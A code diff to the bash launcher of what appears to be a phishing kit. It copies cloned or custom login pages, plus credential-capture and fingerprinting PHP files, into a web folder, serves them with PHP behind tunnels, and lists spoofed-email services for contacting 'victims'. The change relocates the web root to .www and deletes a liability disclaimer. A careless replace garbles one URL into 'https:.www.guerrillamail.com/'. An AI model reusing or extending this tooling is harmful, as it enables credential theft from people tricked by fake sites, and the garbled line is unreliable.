@@ -7,7 +7,7 @@ chmod -R 777 tunnels.sh
 chmod -R 777 .host
 chmod -R 777 .pages
 chmod -R 777 .tunnels_log
-chmod -R 777 /www
+chmod -R 777 .www
 
 
 
@@ -85,8 +85,8 @@ if [[ ! -d ".host" ]]; then
 mkdir -p ".host"
 fi
 
-if [[ ! -d "/www" ]]; then
-mkdir -p "/www"
+if [[ ! -d ".www" ]]; then
+mkdir -p ".www"
 fi
 
 
@@ -94,7 +94,6 @@ fi
 # Clear content of log files
 
 truncate -s 0 .tunnels_log/.cloudfl.log 
-
 truncate -s 0 .tunnels_log/.localrun.log 
 
 
@@ -130,7 +129,7 @@ ${WHITE}    ███████ ██ █ ██ ${RED}█████  ${WHI
 ${WHITE}         ██ ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██
 ${WHITE}  █████████ ██ ${GREEN}NO${RED}-${GREEN}IM${RED}-${GREEN}NOT${RED}-${GREEN}ANOTHER${RED}-${GREEN}AI${RED}-${GREEN}BOT${WHITE} ██     
  ${ORANGE}[!]  FOR EDUCATIONAL PURPOSES ONLY!  ${WHITE}  ██ 
-${CYAN}THE DEVELOPER IS NOT RESPONSIBLE FOR ANYTHING...
+
 
 
 EOF
@@ -170,22 +169,22 @@ setup_clone(){
 
     # Setup cloned page and server
 echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
-rm -rf /www/*
-cp -rf .pages/"$site"/* /www
+rm -rf .www/*
+cp -rf .pages/"$site"/* .www
 echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
-cd /www && php -S "$host":"$port" > /dev/null 2>&1 & 
+cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 
 }
 
 
 
 setup_clone_manual() {
 
-   rm -rf /www/*
+   rm -rf .www/*
    
-   cp -rf .manual_attack/index.html /www
-   cp -rf .manual_attack/post.php /www
-   cp -rf .manual_attack/__ROOT__/index.php /www
-   cp -rf .manual_attack/__ROOT__/fingerprints.php /www
+   cp -rf .manual_attack/index.html .www
+   cp -rf .manual_attack/post.php .www
+   cp -rf .manual_attack/__ROOT__/index.php .www
+   cp -rf .manual_attack/__ROOT__/fingerprints.php .www
    
    
    rm -rf .manual_attack/index.html
@@ -193,7 +192,7 @@ setup_clone_manual() {
    rm -rf .manual_attack/data.txt
    
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
-   cd /www && php -S "$host":"$port" > /dev/null 2>&1 & 
+   cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 
 }
 
 
@@ -202,10 +201,10 @@ setup_clone_customize(){
 
     # Setup cloned page and server
 echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
-rm -rf /www/*
-cp -rf .customize/"$site"/* /www
+rm -rf .www/*
+cp -rf .customize/"$site"/* .www
 echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
-cd /www && php -S "$host":"$port" > /dev/null 2>&1 & 
+cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 
 }
 
 
@@ -840,7 +839,7 @@ email() {
 
     echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Use this services for send email to Victims \n"
    
-    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https:/www.guerrillamail.com/ \n"
+    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https:.www.guerrillamail.com/ \n"
     echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://emkei.cz/ ${MAGENTA} (recommended) \n"
     echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://mailspre.com/ \n"
     echo -ne "\n\n"
